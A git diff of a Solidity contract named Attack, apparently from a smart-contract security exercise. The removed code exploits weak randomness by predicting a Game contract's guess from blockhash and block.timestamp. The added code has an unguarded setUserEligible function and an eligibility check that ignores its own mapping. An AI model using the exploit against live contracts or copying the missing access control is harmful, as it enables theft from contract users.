@@ -1,18 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
-import './Game.sol';
-
 contract Attack{
-    Game game;
-    constructor(address _gameAddress){
-        game = Game(_gameAddress);
+    address owner;
+    mapping(address => bool) userEligible;
+
+    constructor(){
+        owner=msg.sender;
     }
 
-    function attack() public{
-        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
-        game.guess(_guess);
+    function isUserEligible(address user) public view returns (bool) {
+        if(user == owner) {
+            return true;
+        }
+        return false;
     }
 
-    receive() external payable{}
+    function setUserEligible(address user) public {
+        userEligible[user] = true;
+    }
+
+    fallback() external {}
 }
